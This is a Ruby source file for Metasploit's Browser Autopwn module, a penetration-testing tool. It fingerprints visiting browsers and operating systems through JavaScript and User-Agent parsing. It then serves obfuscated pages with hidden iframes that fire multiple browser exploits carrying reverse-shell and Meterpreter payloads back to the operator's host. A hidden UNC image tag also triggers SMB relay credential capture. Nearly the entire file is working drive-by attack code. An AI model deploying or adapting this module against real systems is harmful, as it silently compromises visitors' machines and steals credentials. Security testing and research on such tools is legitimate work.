##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'rex/exploitation/javascriptosdetect.rb'

module Msf

class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary

	include Exploit::Remote::HttpServer::HTML
	include Auxiliary::Report
	
	def initialize(info = {})
		super(update_info(info, 
			'Name'        => 'HTTP Client fingerprinter and autoexploiter',
			'Version'     => '$Revision: $',
			'Description' => %q{
				Webbrowser fingerprinter and autoexploiter. 
				},
			'Author'      => [
					'egypt <egypt@nmt.edu>',  # initial concept, integration and extension of Jerome's os_detect.js
					'Jerome Athias' # advanced Windows OS detection in javascript
				],
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
				 	[ 'WebServer' ]
				],
			'PassiveActions' => 
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options([
			OptAddress.new('LHOST', [true, 'Your local IP address ror reverse payloads']),
			OptPort.new('LPORT', [false, 'For reverse payloads; incremented for each exploit', 4444])
			])

		@exploits = Hash.new
	end
	def init_exploit(name, targ = 0)
		targ ||= 0
		case name
		when %r{exploit/windows}
			payload='windows/meterpreter/reverse_tcp'
		else
			payload='generic/shell_reverse_tcp'
		end	
		@exploits[name] = framework.modules.create(name)
		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']

		# for testing, set the exploit uri to the name of the exploit so it's
		# easy to tell what is happening from the browser
		@exploits[name].datastore['URIPATH'] = name  

		@exploits[name].datastore['LPORT']   = @lport
		@exploits[name].datastore['LHOST']   = @lhost
		@exploits[name].exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => targ,
			'Payload'        => payload,
			'RunAsJob'       => true)

		@lport += 1
	end

	def setup() 
		super
		@lport = datastore['LPORT'] || 4444
		@lhost = datastore['LHOST']
		@lport = @lport.to_i
		print_status("Starting exploit modules on host #{@lhost}...")

		##
		# Start all the exploit modules
		##

		# TODO: add an Automatic target to all of the Firefox exploits

		# Firefox < 1.0.5
		# requires javascript
		init_exploit('exploit/multi/browser/mozilla_compareto')

		# Firefox < 1.5.0.5
		# requires java
		# requires javascript
		init_exploit('exploit/multi/browser/mozilla_navigatorjava')

		# Firefox < 1.5.0.1
		# For now just use the default target of Mac.
		# requires javascript
		init_exploit('exploit/multi/browser/firefox_queryinterface')

		# works on iPhone 
		# does not require javascript
		#init_exploit('exploit/osx/armle/safari_libtiff')

		#init_exploit('exploit/osx/browser/software_update')
		#init_exploit('exploit/windows/browser/ani_loadimage_chunksize')

		# does not require javascript
		init_exploit('exploit/windows/browser/apple_quicktime_rtsp')

		# requires javascript
		init_exploit('exploit/windows/browser/novelliprint_getdriversettings')

		# Works on default IE 5 and 6
		# I'm pretty sure keyframe works on everything this works on, but since
		# this doesn't need javascript, try it anyway.
		# does not require javascript
		init_exploit('exploit/windows/browser/ms03_020_ie_objecttype')

		# I'm pretty sure keyframe works on everything this works on and more,
		# so for now leave it out.
		# requires javascript
		#init_exploit('exploit/windows/browser/ms06_055_vml_method')

		# Works on default IE 5 and 6
		# requires javascript 
		# ActiveXObject('DirectAnimation.PathControl')
		# classid D7A7D7C3-D47F-11D0-89D3-00A0C90833E6
		init_exploit('exploit/windows/browser/ms06_067_keyframe')

		# only works on IE with XML Core Services
		# requires javascript
		# classid 88d969c5-f192-11d4-a65f-0040963251e5
		init_exploit('exploit/windows/browser/ms06_071_xml_core')

		#init_exploit('exploit/windows/browser/winamp_playlist_unc')

		# requires UNC path which only seems to work on IE in my tests
		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
			
		smbr_mod.datastore['LHOST']   = @lhost
		smbr_mod.datastore['LPORT']   = @lport
		smbr_mod.exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => 0,
			'Payload'        => 'windows/meterpreter/reverse_tcp',
			'RunAsJob'       => true)
	end

	def on_request_uri(cli, request) 
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		# Create a cached mapping between IP and detected target
		@targetcache ||= {}
		@targetcache[cli.peerhost] ||= {}
		@targetcache[cli.peerhost][:update] = Time.now.to_i

		# Clean the cache 
		rmq = []
		@targetcache.each_key do |addr|
			if (Time.now.to_i > @targetcache[addr][:update]+60)
				rmq.push addr
			end
		end
				
		rmq.each {|addr| @targetcache.delete(addr) }
	
		case request.uri
			when %r{^#{datastore['URIPATH']}.*sessid=}: 
				record_detection(cli, request)
				send_not_found(cli)
			when %r{^#{datastore['URIPATH']}}: 
				#
				# This is the request for exploits.  At this point we should at
				# least know whether javascript is enabled; if it is, we'll
				# have browser name and version for IE and Firefox as well as
				# OS version and Service Pack for Windows.  If our javascript
				# detection failed to report back, try to get the same
				# information from the User-Agent string which is less reliable
				# because it may have been spoofed.
				#

				record_detection(cli, request)
				print_status("Responding with exploits")

				response = build_sploit_response(cli, request)
				response['Expires'] = '0'
				response['Cache-Control'] = 'must-revalidate'

				cli.send_response(response)
			else
				print_error("I don't know how to handle this request #{request.uri}, sending 404")
				send_not_found(cli)
				return false
		end
	end

	def run
		exploit()
	end

	def build_sploit_response(cli, request)
		if (!@targetcache[cli.peerhost]) 
			record_detection(cli, request)
		end
			
		response = create_response()

		# TODO: instead of writing all of the iframes at once,
		# consider having a javascript timeout function that writes
		# each exploit's iframe so they don't step on each other.
		# I'm not sure this is really an issue since IE seems to
		# just load the next iframe when the first didn't crash it.

		objects = { 
			'{88d969c5-f192-11d4-a65f-0040963251e5}' => @exploits['exploit/windows/browser/ms06_071_xml_core'].get_resource,
			'{36723F97-7AA0-11D4-8919-FF2D71D0D32C}' => @exploits['exploit/windows/browser/novelliprint_getdriversettings'].get_resource,
			'DirectAnimation.PathControl'            => @exploits['exploit/windows/browser/ms06_067_keyframe'].get_resource, 
		}
		hash_declaration = objects.map{ |k, v| "'#{k}', '#{v}'," }.join.chop

		js = <<-ENDJS
			#{js_os_detect}
			#{js_base64}

			// Hash implementation stolen from http://www.mojavelinux.com/articles/javascript_hashes.html
			function Hash() {
				this.length = 0;
				this.items = new Array();
				for (var current_item = 0; current_item < arguments.length; current_item += 2) {
					if (typeof(arguments[current_item + 1]) != 'undefined') {
						this.items[arguments[current_item]] = arguments[current_item + 1];
						this.length++;
					}
				}
			}

			function send_detection_report(detected_version) {
				try { xml = new XMLHttpRequest(); }
				catch(e) {
					try { xml = new ActiveXObject("Microsoft.XMLHTTP"); }
					catch(e) {
						xml = new ActiveXObject("MSXML2.ServerXMLHTTP");
					}
				}
				if (! xml) {
					return(0);
				}
				var url = "asdf".replace("asdf", "");
				url += detected_version.os_name + "asdf"; 
				url += detected_version.os_flavor + "asdf"; 
				url += detected_version.os_sp + "asdf"; 
				url += detected_version.os_lang + "asdf"; 
				url += detected_version.arch + "asdf"; 
				url += detected_version.browser_name + "asdf"; 
				url += detected_version.browser_version; 
				url = url.replace(/asdf/g, ":");
				url = Base64.encode(url);
				document.write(url + "<br>");
				xml.open("GET", document.location + "/sessid=" + url, false);
				xml.send(null);
			}

			function BodyOnLoad() {
				var sploit_frame = '';
				var body_elem = document.getElementById('body_id');
				var detected_version = getVersion();

				send_detection_report(detected_version);

				if ("#{HttpClients::IE}" == detected_version.browser_name) {
					document.write("This is IE<br />");
					// object_list contains key-value pairs like 
					//        {classid} => /path/to/exploit/for/classid
					//   and
					//        ActiveXname => /path/to/exploit/for/ActiveXname
					var object_list = new Hash(#{hash_declaration});
					var vuln_obj;

					// iterate through our list of exploits 
					document.write("I have " + object_list.length + " objects to test <br />");
					for (var current_item in object_list.items) {
						//document.write("Testing for object " + current_item + " ... ");
						vuln_obj = undefined;
						if (current_item.substring(0,1) == '{') {
							// classids are stored surrounded in braces for an easy way to tell 
							// them from ActiveX object names, so if it has braces, strip them 
							// out and create an object element with that classid
							var obj_elem = document.createElement("object");

							//document.write("which is a clasid <br />");
							if (obj_elem) {
								obj_elem.setAttribute("cl" + "as" + "sid", "cl" + "s" + "id" +":" + current_item.substring( 1, current_item.length - 1 ) ) ;
								//document.write("bug1? <br />");
								obj_elem.setAttribute("id", current_item);
								//document.write("bug2? <br />");
								vuln_obj = document.getElementById(current_item);
								//document.write("bug4? <br />");
							} else {
								document.write("createElement failed <br />");
							}
						} else {
							document.write("which is an AXO <br />");
							// otherwise, try to create an AXO with that name
							try { 
								vuln_obj = new ActiveXObject(current_item); 
							} catch(e){}
						}
						if (vuln_obj) {
							//document.write("It exists, making evil iframe <br />");
							//sploit_frame += '#{build_iframe("' + object_list.items[current_item] + '")}';
							sploit_frame += '<p>' + object_list.items[current_item] + '</p>';
							sploit_frame += '<iframe ';
							sploit_frame += 'src="'+ object_list.items[current_item] +'" ';
							sploit_frame += 'style="visibility:hidden" height="0" width="0" border="0"></iframe>';
						} else {
							//document.write("It does NOT exist, skipping. <br />");
						}
					} // for each exploit
				} // if IE
				else {
					document.write("this is NOT MSIE<br />");
					if (window.navigator.javaEnabled && window.navigator.javaEnabled()) {
						sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/mozilla_navigatorjava'].get_resource)}';
					}
					if (window.InstallVersion) {
						sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/mozilla_compareto'].get_resource)}';
					}
					if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
						if (location.QueryInterface) {
							sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/firefox_queryinterface'].get_resource)}';
						}
					}
				}
				if (0 < sploit_frame.length) { 
					document.write("Conditions optimal, writing evil iframe(s) <br />"); 
					document.write(sploit_frame); 
				}
			} // function BodyOnLoad
			window.onload = BodyOnLoad
		ENDJS
		opts = {
			'Symbols' => {
				'Variables' => [
					'current_item', 'items',
					'body_elem', 'body_id', 
					'object_list', 'vuln_obj', 
					'obj_elem', 'sploit_frame',
					'detected_version'
				],
				'Methods'   => [
					'Hash', 'BodyOnLoad', 
					'send_detection_report', 'xml'
				]
			},
			'Strings' => true
		}

		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.update_opts(js_os_detect.opts)
		js.update_opts(js_base64.opts)
		js.obfuscate({'Strings'=>true})

		# Since ms03_020 works without javascript and we can guarantee with
		# conditional comments that it won't eat resources in non-IE browsers,
		# go ahead and send it with all responses in case our detection failed.
		body = <<-ENDHTML
			<body id="#{js.sym('body_id')}">
			<!--   [if lt IE 7]>
			#{build_iframe(@exploits['exploit/windows/browser/ms03_020_ie_objecttype'].get_resource)}
			<![endif]-->
		ENDHTML

		response.body = ' <html> <head> <title> Loading </title> '
		response.body << ' <script type="text/javascript">' + js + ' </script> '
		response.body << ' </head> ' + body 

		case (get_target_os(cli))
			when OperatingSystems::WINDOWS
				# add the img tag for smb_relay
				response.body << %Q{
					<img src="\\\\#{@lhost}\\public\\#{Rex::Text.rand_text_alpha(15)}.jpg" style="visibility:hidden" height="0" width="0" border="0" />
					#{build_iframe(@exploits['exploit/windows/browser/apple_quicktime_rtsp'].get_resource)} 
				}
			when OperatingSystems::MAC_OSX
				if ('armle' == get_target_arch(cli))
					response.body << build_iframe(@exploits['exploit/osx/armle/safari_libtiff'].get_resource)
				end
		end
		response.body << "</body></html>"

		return response
	end

	def record_detection(cli, request)
		os_name = nil
		os_flavor = nil
		os_sp = nil
		os_lang = nil
		arch = nil
		ua_name = nil
		ua_vers = nil

		data_offset = request.uri.index('sessid=')
		if (data_offset.nil? or -1 == data_offset) 
			print_status("Recording detection from User-Agent")
			# then we didn't get a report back from our javascript
			# detection; make a best guess effort from information 
			# in the user agent string.  The OS detection should be
			# roughly the same as the javascript version because it
			# does most everything with navigator.userAgent

			ua = request['User-Agent']
			# always check for IE last because everybody tries to
			# look like IE
			case (ua)
				when /Version\/(\d+\.\d+\.\d+).*Safari/
					ua_name = HttpClients::SAFARI
					ua_vers  = $1
				when /Firefox\/((:?[0-9]+\.)+[0-9]+)/:
					ua_name = HttpClients::FF
					ua_vers  = $1
				when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]\.[0-9]+)/:
					ua_name = HttpClients::IE
					ua_vers  = $1
			end
			case (ua)
				when /Windows/:
					os_name = OperatingSystems::WINDOWS
					arch = ARCH_X86
				when /Linux/:
					os_name = OperatingSystems::LINUX
				when /iPhone/
					os_name = OperatingSystems::MAC_OSX
					arch = 'armle'
				when /Mac OS X/
					os_name = OperatingSystems::MAC_OSX
			end
			case (ua)
				when /Windows 95/:
					os_flavor = '95'
				when /Windows 98/:
					os_flavor = '98'
				when /Windows NT 4/:
					os_flavor = 'NT'
				when /Windows NT 5.0/:
					os_flavor = '2000'
				when /Windows NT 5.1/:
					os_flavor = 'XP'
				when /Windows NT 5.2/:
					os_flavor = '2003'
				when /Windows NT 6.0/:
					os_flavor = 'Vista'
				when /Gentoo/:
					os_flavor = 'Gentoo'
				when /Debian/:
					os_flavor = 'Debian'
				when /Ubuntu/:
					os_flavor = 'Ubuntu'
			end
			case (ua)
				when /PPC/
					arch = ARCH_PPC
				when /i.86/
					arch = ARCH_X86
			end

			print_status("Browser claims to be #{ua_name} #{ua_vers}, running on #{os_name} #{os_flavor}")
		else
			print_status("Recording detection from JavaScript")
			data_offset += 'sessid='.length
			detected_version = request.uri[data_offset, request.uri.length]
			if (0 < detected_version.length)
				detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
				print_status("Report: #{detected_version}")
				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_vers) = detected_version.split(':')
			end
		end
		arch ||= ARCH_X86

		@targetcache[cli.peerhost][:os_name]   = os_name
		@targetcache[cli.peerhost][:os_flavor] = os_flavor
		@targetcache[cli.peerhost][:os_sp]     = os_sp
		@targetcache[cli.peerhost][:os_lang]   = os_lang
		@targetcache[cli.peerhost][:arch]      = arch
		@targetcache[cli.peerhost][:ua_name]   = ua_name
		@targetcache[cli.peerhost][:ua_vers]   = ua_vers

		report_host(
			:host       => cli.peerhost,
			:os_name    => os_name,
			:os_flavor  => os_flavor, 
			:os_lang    => os_lang, 
			:os_sp      => os_sp, 
			:arch       => arch
		)
		report_note(
			:host       => cli.peerhost,
			:type       => 'http_request',
			:data       => "UA:#{ua_name} UA_VER:#{ua_vers}"
		)

	end
	
	# This or something like it should probably be added upstream in Msf::Exploit::Remote
	def get_target_os(cli)
		if framework.db.active
			host = framework.db.get_host(nil, cli.peerhost)
			res = host.os_name
		elsif @targetcache[cli.peerhost][:os_name]
			res = @targetcache[cli.peerhost][:os_name]
		else
			res = OperatingSystems::UNKNOWN
		end
		return res
	end

	# This or something like it should probably be added upstream in Msf::Exploit::Remote
	def get_target_arch(cli)
		if framework.db.active
			host = framework.db.get_host(nil, cli.peerhost)
			res = host.arch
		elsif @targetcache[cli.peerhost][:arch]
			res = @targetcache[cli.peerhost][:arch]
		else
			res = ARCH_X86
		end
		return res
	end

	def build_iframe(resource)
		#return "<p>#{resource}</p>"
		return "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
	end
end
end

